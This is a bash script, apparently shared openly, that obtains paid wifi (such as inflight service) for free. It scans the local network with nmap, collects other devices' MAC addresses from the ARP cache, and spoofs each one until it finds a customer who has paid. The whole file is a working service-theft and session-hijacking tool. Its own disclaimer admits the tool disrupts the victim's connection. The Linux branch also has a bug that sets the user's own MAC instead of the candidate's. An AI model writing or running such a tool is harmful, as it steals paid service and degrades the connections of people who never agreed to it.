#/bin/bash
#
# free_wifi.sh
#
# Description: 
# Get free wifi by spoofing an authenticated mac address on a paid wifi service like
# inflight wifi. Obviously in order for this to work there needs to be at least one
# device on the network that paid for the wifi service. The script attempts to find 
# that device and uses the mac address of that device.
# 
# Disclaimer: 
# This will obviously create lot of packet collitions/problems on the network and  
# create slowness for you and the device you are spoofing, so just pay for the 
# wifi service, don't be a free loader :) If you do choose to use this script, you 
# are using at your own risk and I am not liable for any loss or damage you have 
# caused by using this script.
#
# Author:  Arul Selvan
# Version: Feb 4, 2017
# OS: macOS, Linux
# See also: spoof_mac.sh
#

# google dns for validating connectivity
gdns=8.8.8.8
my_mac_addr_file="$HOME/.my_mac_address"
my_mac=""
iface="en0"
os_name=`uname -s`
# calculate the elapsed time (shell automatically increments the var SECONDS magically)
SECONDS=0
sleep_sec=30


check_root() {
  if [ `id -u` -ne 0 ] ; then
    echo "[ERROR] you must be 'root' to run this script... exiting."
    exit
  fi
}

ping_check() {
  /sbin/ping -t30 -c3 -qo $gdns >/dev/null 2>&1
  return $?
}

restore_mac() {
  echo "[INFO] restoring mac to $my_mac ..."

  if [ $os_name = "Darwin" ]; then
    ifconfig $iface ether $my_mac
  else
    ifconfig $iface hw ether $my_mac
  fi
}

save_mac() {
  echo "[INFO] reading my mac address ..."
  if [ ! -f $my_mac_addr_file ] ; then
    echo "[WARN] no previously saved mac file ($my_mac_addr_file) found!"
    echo "[WARN] saving current mac address as saved mac address"
    my_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
    echo $my_mac > $my_mac_addr_file
  else
    my_mac=`cat $my_mac_addr_file`
    echo "[INFO] my mac address $my_mac is already saved."
  fi
}

usage() {
  echo "Usage: $0 [interface]"
  exit
}

elapsed_time() {
  duration=$SECONDS
  echo "[INFO] Total elapsed time is $(($duration / 60)) minutes and $(($duration % 60)) seconds"
  exit
}

check_mac() {
  mac_addr=$1
  if [ $os_name = "Darwin" ]; then  
    ifconfig $iface ether $mac_addr
  else
    ifconfig $iface hw ether $my_mac    
  fi

  # take the interface down and up to ask for dhcp
  echo "[INFO] taking iface down and up ..."
  ifconfig $iface down
  sleep 1
  ifconfig $iface up
  sleep 1
  /bin/echo -n "[INFO] waiting for new IP assignment ."
  count=30
  for (( i = 0; i<$count; i++ )) do
    sleep 1
    /bin/echo -n .
    #ip=`ipconfig getifaddr $iface`
    ip=`ip addr show $iface | grep 'inet ' | awk '{print $2}' |cut -f1 -d'/'`
    if [ ! -z $ip ] ; then
      break
    fi
  done

  echo ""
  echo "[INFO] checking for connectivity ..."
  ping_check
  if [ $? -eq 0 ] ; then
    echo "[SUCCESS] got connectivity!"
    elapsed_time
  else
    echo "[ERROR] connctivity failed for $mac_addr"
  fi
  return
}

search_free_wifi() {
  # do a nmap to collect macaddress in arp cache
  echo "[INFO] collecting arp cache ..."
  #my_net=`ipconfig getifaddr $iface|awk -F. '{print $1"."$2"."$3".0/24"; }'`
  my_net=`ip addr show $iface | grep 'inet ' | awk '{print $2}' |cut -f1 -d'/'|awk -F. '{print $1"."$2"."$3".0/24";}'`

  echo "[INFO] scanning net $my_net"
  nmap --host-timeout 3 -T5 $my_net >/dev/null 2>&1

  # now get the list of macs and iterate through to find an 
  # authenticated mac (someone who paid for this crappy wifi)
  list_of_macs=`arp -an -i $iface|awk '{print $4;}'`


  # search through all the macs we collected
  for mac in $list_of_macs; do 
    if [ $mac = "(incomplete)" ] ; then
      continue
    elif [ $mac = "ff:ff:ff:ff:ff:ff" ] ; then
      continue
    elif [ $mac = $my_mac ] ; then
      continue
    fi
    echo "[INFO] checking: $mac ..."
    check_mac $mac
  done
}

#  ------------ main -----------------
check_root

if [ ! -z $1 ] ; then
  iface=$1
fi

# save our mac address first
save_mac

# make 3 trys, if we don't get any just exit.
for ((i=0; i<3; i++)) {
  echo "[INFO] searching for wifi. Attempt#$i ..."
  
  search_free_wifi

  echo "[INFO] sleeping $sleep_sec ..."
  sleep 30
}

# if we get here nothing is available, just restore and exit
echo "[ERROR] unable to find a working macaddr to use, restoring ..."
restore_mac
elapsed_time
